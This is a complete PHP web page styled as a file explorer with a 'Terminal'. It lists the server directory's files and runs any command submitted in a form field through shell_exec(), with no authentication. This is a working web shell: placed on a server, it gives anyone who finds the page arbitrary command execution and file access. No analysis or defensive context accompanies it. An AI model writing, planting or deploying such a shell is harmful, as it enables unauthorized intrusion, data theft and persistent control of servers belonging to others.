<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Octopus File Explorer + Terminal</title>
  <style>
    body {
      font-family: monospace;
      background-color: #111;
      color: #eee;
      margin: 0;
      padding: 0;
    }

    header {
      background-color: #0f0;
      color: #000;
      padding: 1em;
      text-align: center;
      font-weight: bold;
    }

    .container {
      padding: 1em;
    }

    input[type="text"] {
      width: 100%;
      padding: 0.5em;
      margin-bottom: 1em;
      border: none;
      background-color: #222;
      color: #fff;
    }

    table {
      width: 100%;
      border-collapse: collapse;
    }

    th, td {
      padding: 0.5em;
      border: 1px solid #444;
    }

    th {
      background-color: #333;
    }

    a {
      color: #0f0;
      text-decoration: none;
    }

    .terminal {
      background-color: #000;
      padding: 1em;
      margin-top: 2em;
    }

    .terminal input {
      width: 100%;
      background: #111;
      border: none;
      color: #0f0;
      padding: 0.5em;
      font-family: monospace;
    }

    .output {
      background: #111;
      color: #0f0;
      padding: 1em;
      white-space: pre-wrap;
      margin-top: 1em;
      border: 1px solid #333;
      max-height: 300px;
      overflow-y: auto;
    }
  </style>
</head>
<body>

<header>📁 Welcome to Octopus File Explorer + Terminal</header>

<div class="container">
  <input type="text" id="myInput" placeholder="🔍 Search files..." onkeyup="filterTable()">

  <table id="myTable">
    <thead>
      <tr><th>Name</th><th>Link</th></tr>
    </thead>
    <tbody>
      <?php
      function url($file = ''): string {
          $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
          $domain = $_SERVER['HTTP_HOST'];
          $path = rtrim(dirname($_SERVER['PHP_SELF']), '/\\');
          return "$protocol://$domain$path/$file";
      }

      $items = scandir('.');
      foreach ($items as $item) {
          if ($item === '.' || $item === '..') continue;
          echo "<tr><td>$item</td><td><a href=\"" . url($item) . "\" target=\"_blank\">Open</a></td></tr>";
      }
      ?>
    </tbody>
  </table>

  <div class="terminal">
    <form method="post">
      <label>💻 Terminal:</label>
      <input type="text" name="cmd" placeholder="Enter shell command and press Enter">
    </form>
    <?php
    if (!empty($_POST['cmd'])) {
        echo "<div class='output'>";
        echo htmlspecialchars(shell_exec($_POST['cmd']) ?? 'No output');
        echo "</div>";
    }
    ?>
  </div>
</div>

<script>
  function filterTable() {
    let input = document.getElementById("myInput");
    let filter = input.value.toUpperCase();
    let table = document.getElementById("myTable");
    let tr = table.getElementsByTagName("tr");

    for (let i = 1; i < tr.length; i++) {
      let td = tr[i].getElementsByTagName("td")[0];
      if (td) {
        let txtValue = td.textContent || td.innerText;
        tr[i].style.display = txtValue.toUpperCase().indexOf(filter) > -1 ? "" : "none";
      }
    }
  }
</script>

</body>
</html>
